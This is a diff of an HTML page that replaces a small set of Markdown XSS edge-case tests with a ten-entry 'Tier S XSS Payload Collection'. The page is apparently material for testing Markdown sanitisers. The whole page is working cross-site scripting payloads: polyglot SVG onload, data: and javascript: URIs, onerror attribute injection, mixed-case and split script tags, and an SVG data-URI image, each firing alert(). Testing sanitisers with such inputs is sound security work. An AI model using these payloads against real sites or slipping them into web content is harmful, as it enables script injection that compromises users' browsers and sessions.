@@ -2,25 +2,40 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>XSS Markdown Edge-case Test</title>
+  <title>Tier S XSS Payload Collection</title>
 </head>
 <body>
-  <h1>XSS Markdown Edge-case Test</h1>
+  <h1>Tier S XSS Payload Collection</h1>
 
-  <h2>Payload 1 – Markdown link trộn JS</h2>
-  <p>[Click me](javascript:alert('XSS-MD-1'))</p>
+  <!-- Polyglot -->
+  <p>![polyglot]("><svg/onload=alert('polyglot')>)</p>
 
-  <h2>Payload 2 – Image Markdown với onerror</h2>
-  <p>![xss](x"onerror="alert('XSS-MD-2'))</p>
+  <!-- Protocol abuse -->
+  <p>[protocol](data:text/html,<script>alert('protocol')</script>)</p>
 
-  <h2>Payload 3 – Inline HTML trong Markdown</h2>
-  <div><img src="x" onerror="alert('XSS-MD-3')"></div>
+  <!-- Unicode homoglyph -->
+  <p>[unicode](javascri pt:alert('unicode'))</p>
 
-  <h2>Payload 4 – Mixed heading + script</h2>
-  <p># Heading &lt;script&gt;alert("XSS-MD-4")&lt;/script&gt;</p>
+  <!-- Double encode -->
+  <p>[double](javascript:alert(&#x27;double&#x27;))</p>
 
-  <h2>Payload 5 – Autolink style</h2>
-  <p>&lt;javascript:alert('XSS-MD-5')&gt;</p>
+  <!-- Attribute injection -->
+  <p>![attr](x onerror=alert('attr'))</p>
+
+  <!-- Mixed case -->
+  <p><ScRiPt>alert('mixed')</ScRiPt></p>
+
+  <!-- Nested tag -->
+  <p><svg><a xlink:href="javascript:alert('nested')">click</a></svg></p>
+
+  <!-- Broken closing -->
+  <p><scr<script>ipt>alert('broken')</scr</script>ipt></p>
+
+  <!-- Long obfuscation -->
+  <p>&lt;img src=x onerror=alert(&#39;obfusc&#39;)&gt;</p>
+
+  <!-- Data URI image -->
+  <p><img src="data:image/svg+xml,<svg/onload=alert('datauri')>"></p>
 
 </body>
 </html>
